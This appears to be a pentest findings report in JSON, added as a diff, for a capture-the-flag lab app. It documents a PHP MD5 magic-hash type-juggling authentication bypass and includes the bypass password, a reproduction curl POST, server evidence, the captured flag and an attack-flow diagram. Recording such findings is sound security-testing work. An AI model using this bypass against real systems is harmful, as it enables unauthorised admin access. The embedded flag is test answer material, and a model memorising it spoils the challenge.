@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T23:46:32.162255+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "495aeff8-92c4-49c0-a173-315094204cdb",
+      "timestamp": "2026-04-12T23:46:32.161999+00:00",
+      "title": "PHP Magic Hash Authentication Bypass (Type Juggling)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:38895/index.php",
+      "description": "The Springfield's Vault application uses PHP's loose comparison operator (==) to verify the admin password. The stored hash is 0e678703625362188185747119782643 \u2014 a 'magic hash' that PHP interprets as 0 in scientific notation. Any MD5 hash that also starts with '0e' followed only by digits evaluates to 0 under loose comparison, allowing authentication bypass without knowing the real password. Password '240610708' has MD5 hash 0e462097431906509019562988736854, which PHP treats as equal to the stored hash.",
+      "evidence": "POST /index.php with password=240610708\nServer responded with: Welcome Admin\nCTF Flag: flag{b9d4ad78-52b8-4e0b-8e96-01653394513e}\n\nExplanation:\n  Stored hash: 0e678703625362188185747119782643\n  Magic password: 240610708\n  MD5('240610708') = 0e462097431906509019562988736854\n  PHP: '0e678703...' == '0e462097...' => 0 == 0 => TRUE (type juggling)",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:38895/index.php -d 'password=240610708'",
+        "expected": "Welcome Admin + flag{b9d4ad78-52b8-4e0b-8e96-01653394513e}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "7a2425d0-b2fe-40c2-a94b-b2e49e6edf1b",
+      "timestamp": "2026-04-12T23:46:42.974616+00:00",
+      "title": "Springfield's Vault Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] -->|\"POST /index.php password=240610708\"| Apache[\"Apache 2.4.25 Debian\"]\n  Apache --> PHP[\"PHP 5.6.40 index.php\"]\n  PHP -->|\"md5(input) == stored_hash\"| Compare[\"Loose == Comparison\"]\n  Compare -->|\"0e462... == 0e678... => 0==0 => TRUE\"| Flag[\"Flag Revealed\"]\n  Compare -->|\"mismatch\"| Denied[\"Access Denied\"]\n  Flag --> Response[\"flag{b9d4ad78-52b8-4e0b-8e96-01653394513e}\"]"
+    }
+  ]
+}
